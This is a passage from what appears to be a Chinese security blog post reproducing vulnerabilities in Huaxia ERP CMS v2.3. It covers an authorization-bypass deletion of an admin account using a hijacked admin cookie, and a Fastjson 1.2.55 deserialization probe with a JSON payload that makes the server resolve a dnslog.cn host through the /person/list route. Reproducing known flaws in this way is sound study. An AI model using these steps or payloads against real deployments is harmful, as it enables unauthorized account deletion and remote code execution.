<span class="title class_">StringBuffer</span>();</span><br><span class="line">    sb.append(BusinessConstants.LOG_OPERATION_TYPE_DELETE);</span><br><span class="line">    List&lt;User&gt; list = getUserListByIds(ids);</span><br><span class="line">    <span class="keyword">for</span>(User user: list)&#123;</span><br><span class="line">        sb.append(<span class="string">&quot;[&quot;</span>).append(user.getLoginName()).append(<span class="string">&quot;]&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    logService.insertLog(<span class="string">&quot;用户&quot;</span>, sb.toString(),</span><br><span class="line">            ((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getRequest());</span><br><span class="line">    String idsArray[]=ids.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">    <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span><span class="number">0</span>;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        result=userMapperEx.batDeleteOrUpdateUser(idsArray,BusinessConstants.USER_STATUS_DELETE);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">        JshException.writeFail(logger, e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(result&lt;<span class="number">1</span>)&#123;</span><br><span class="line">        logger.error(<span class="string">&quot;异常码[&#123;&#125;],异常提示[&#123;&#125;],参数,ids:[&#123;&#125;]&quot;</span>,</span><br><span class="line">                ExceptionConstants.USER_DELETE_FAILED_CODE,ExceptionConstants.USER_DELETE_FAILED_MSG,ids);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BusinessRunTimeException</span>(ExceptionConstants.USER_DELETE_FAILED_CODE,</span><br><span class="line">                ExceptionConstants.USER_DELETE_FAILED_MSG);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>破案了，我的项目好像很多功能不像其他大佬的一样实装了功能，我的这里根本就没有删除按键，我只能像刚才一样访问前端文件才能获取到请求头</p>
<p>又破案了，原来这个图标就是删除键，我竟然没看到</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/08/29/%E5%8D%8E%E5%A4%8F-ERP-CMS-v2-3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20250901164141375.png" class title="image-20250901164141375">

<p>而且使用管理员和jsh有按钮删除普通用户，由于这个判断很有可能是用过js代码判断用户名实现前端按键是否显示，后端没有做校验就进行删除，好像甚至没有对删除用户进行判定。也就是说我们可以劫持admin用户的Session，我们就可以实现 任意用户删除用户</p>
<p>先获取admin用户的cookie</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/08/29/%E5%8D%8E%E5%A4%8F-ERP-CMS-v2-3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20250901165523733.png" class title="image-20250901165523733">

<p>然后再登录普通账号进行抓包修改id和cookie即可使用普通账号删除管理员账号</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/08/29/%E5%8D%8E%E5%A4%8F-ERP-CMS-v2-3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20250901170311215.png" class title="image-20250901170311215">

<p>这个删除并不是直接在数据库中删除信息，而是将其statue字段改为1表示停用，后面的逻辑我就不看了，放个sql语句吧</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> Time：<span class="number">0</span> ms - ID：com.jsh.erp.datasource.mappers.UserMapperEx.batDeleteOrUpdateUser</span><br><span class="line">Execute SQL：UPDATE jsh_user <span class="type">SET</span> <span class="variable">status</span> <span class="operator">=</span> <span class="number">1</span> WHERE id <span class="title function_">IN</span> <span class="params">(<span class="string">&#x27;132&#x27;</span>)</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>



<h2 id="6-Fastjson反序列化漏洞"><a href="#6-Fastjson反序列化漏洞" class="headerlink" title="6.Fastjson反序列化漏洞"></a>6.Fastjson反序列化漏洞</h2><p>之前做java sec code靶场的时候就出现过这个漏洞，这个和普通java反序列化漏洞不同的是这个是反序列化json数据，通过json数据像普通序列化一样对TemplatesImpl等类的属性进行赋值然后就弹计算器。</p>
<div class="code-container" code-lang="Xml"><div class="codebox"><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.55<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>fastjson版本为1.2.55，属于有漏洞的版本，我们直接去找反序列化方法parseObject</p>
<p>我们随便找一个路由，还需要参数可以控制，但是我不是特别想从头开始找路由触发方法的链，只能借鉴大佬的了，最后是StringUtil.java，入口的路由为<code>/person/list</code></p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/08/29/%E5%8D%8E%E5%A4%8F-ERP-CMS-v2-3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20250831155901259.png" class title="image-20250831155901259">

<p>根据链子，我们只需要将json数据传递到search即可触发反序列化</p>
<p>我就不弹计算器了，使用dns试下</p>
<div class="code-container" code-lang="Json"><div class="codebox"><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.Inet4Address&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;mgnrbw.dnslog.cn&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>我们先抓到<code>/person/list</code>这个路由的包，主要是怕缺少session等东西</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/08/29/%E5%8D%8E%E5%A4%8F-ERP-CMS-v2-3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20250831161059970.png" class title="image-20250831161059970">

<p>最后成功拿到dns</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/08/29/%E5%8D%8E%E5%A4%8F-ERP-CMS-v2-3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20250831161125166.png" class title="image-20250831161125166">
</div><div class="post-reward"><div class="post-reward-btn" title="Reward The Author"><img src="/assets/images/svg/uc/uc-gift.svg" class="icon noview" alt="Icon"><span></span></div><div class="post-reward-content"><div class="post-reward-text"></div><div class="post-reward-list"><a href="/null" target="_blank">Credits</a></div></div></div><div class="post-copyright"><div class="post-copyright-info">This work is published by John Doe at 2025-08-29 13:09:00</div><div class="post-copyright-link"><span>Link: <a href="http://example.com/2025/08/29/%E5%8D%8E%E5%A4%8F-ERP-CMS-v2-3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">华夏_ERP_CMS_v2.3漏洞复现</a></span><button class="copy-text" type="button" data-text="http://example.com/2025/08/29/%E5%8D%8E%E5%A4%8F-ERP-CMS-v2-3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">Copy</button></div><div class="post-copyright-detail">This work is licensed under <a href='https://creativecommons.org/licenses/by-nc-sa/4.0/' title='Attribution-NonCommercial-ShareAlike' target='_blank'>CC BY-NC-SA 4.0</a>. Please indicate <a href='/'>Mei的小窝</a> when reprinting.</div><img class="post-copyright-icon noview" src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></div><div class="post-tail-tags"></div></div><aside id="post-sidebar" status="show"><div id="toc-container"><div class="toc-title"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"><span>Table Of Content</span></div><div class="toc-content" id="toc-div"><ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#%E5%8D%8E%E5%A4%8F-ERP-CMS-v2-3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-list-text">华夏_ERP_CMS_v2.3漏洞复现</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#1-XSS%E6%B3%A8%E5%85%A5"><span class="toc-list-text">1.XSS注入</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#2-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-list-text">2.SQL注入漏洞</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#3-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%BC%8F%E6%B4%9E"><span class="toc-list-text">3.暴力破解漏洞</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#4-%E7%99%BD%E5%90%8D%E5%8D%95%E8%B6%8A%E6%9D%83"><span class="toc-list-text">4.白名单越权</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#5-%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="toc-list-text">5.越权漏洞</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#6-Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-list-text">6.Fastjson反序列化漏洞</span></a></li></ol></li></ol></div></div></aside></div></div><div id="toolbar" hide=""><div id="toolbar-setting-container" hide=""><div class="toolbar-item"><button id="tool-color-mode" title="Dark Mode" type="button"><img src="/assets/images/svg/ta/ta-moon.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button class="copy-text" id="tool-share" title="Share" type="button" data-text="http://example.com/2025/08/29/%E5%8D%8E%E5%A4%8F-ERP-CMS-v2-3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><img src="/assets/images/svg/ta/ta-share.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-plus" title="Increase Font Size" type="button"><img src="/assets/images/svg/ta/ta-text-plus.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-minus" title="Decrease Font Size" type="button"><img src="/assets/images/svg/ta/ta-text-minus.svg" class="icon noview" alt="Icon"></button></div></div><div class="toolbar-container"><div class="toolbar-item"><button id="tool-setting" title="Settings" type="button"><img src="/assets/images/svg/ta/ta-setting.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-toc" title="Table Of Content" type="button"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-gototop" title="Go To Top" type="button"><img src="/assets/images/svg/ta/ta-up.svg" class="icon noview" alt="Icon"></button></div></div></div></main><footer><div class="footer"><div id="footer-copyright">© 2024 - 2025 <span>💗</span> <a href="/null">John Doe</a></div><div id="footer-info"><div id="footer-framework">🚀Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/chanwj/hexo-theme-meow" title="3.2.0" target="_blank">Meow</a></div><div id="footer-runtime"><span id="runtime" data-startdate="2024-04-02T22:16:20.000Z">🌻Blog Runtime: . Years . Months . Days</span></div></div></div></footer><div class="scripts"><script>const GLOBALCONFIG = {
  root: '/',
  toolbar: true,
  lazyload_src: '/assets/images/Meow-Loading.webp',
  friends: false,
  codeblock: true,
  share_text: '🐱Share From Meow',
  onblur_title: 'Please Come Back～✧(´▽`ʃ♡ƪ)',
  mouse_click: false,
  notify:{
    enable: false,
    info: 'Copied successfully! Please mark the address of this post if redistribute.',
    f12_info: 'Turned on developer mode, please follow the copyright license of this website'
  },
  search: {
    enable: false,
    path: '',
    local: {
      top_n_per_article: 1,
      preload: false
    }
  },
  encrypt: false,
};
</script><script>if (!localStorage.getItem('color-mode')) {
  localStorage.setItem('color-mode', 'light' || 'light');
}
document.body.setAttribute('data-mode', localStorage.getItem('color-mode'));
</script>
<script src="/js/theme/tools/utils.js"></script>

<script src="/js/plugins/dist/lazyload.min.js"></script>

<script src="/js/plugins/view-image.min.js"></script>
<script>if (localStorage.getItem('font-size')) {
  document.querySelector('.post').style.fontSize = localStorage.getItem('font-size') + 'px';
}
</script>
<script src="/js/main.js" type="module"></script>
</div></body></html>